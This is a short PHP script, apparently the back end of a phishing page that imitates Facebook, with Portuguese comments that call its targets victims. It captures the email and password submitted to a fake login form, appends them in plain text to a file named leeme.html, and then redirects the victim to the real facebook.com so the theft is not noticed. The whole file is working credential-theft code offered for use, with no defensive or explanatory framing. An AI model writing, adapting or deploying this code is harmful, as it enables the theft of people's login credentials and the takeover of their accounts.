<?
/*
Esse arquivo e o que processa todos os dados da vitima e os salva em um arquivo (leeme.html <- Aqui os dados serao salvos).
*/

#haxor.php
// Atribua o valor as variaveis ​​de usuario e senha
$email = $_POST['email'];
$pass = $_POST['pass'];
//Atribua o valor a variavel em que o nome de usuario e a senha sao salvos
$guardame = fopen('leeme.html','a+');
fwrite($guardame,
"Email: ".$email.

"\nPass: ".$pass." ");

fclose($guardame);
//redireciona para a pagina original(facebook)
echo "<meta http-equiv='refresh' content='1;url=http://www.facebook.com'>"
?>
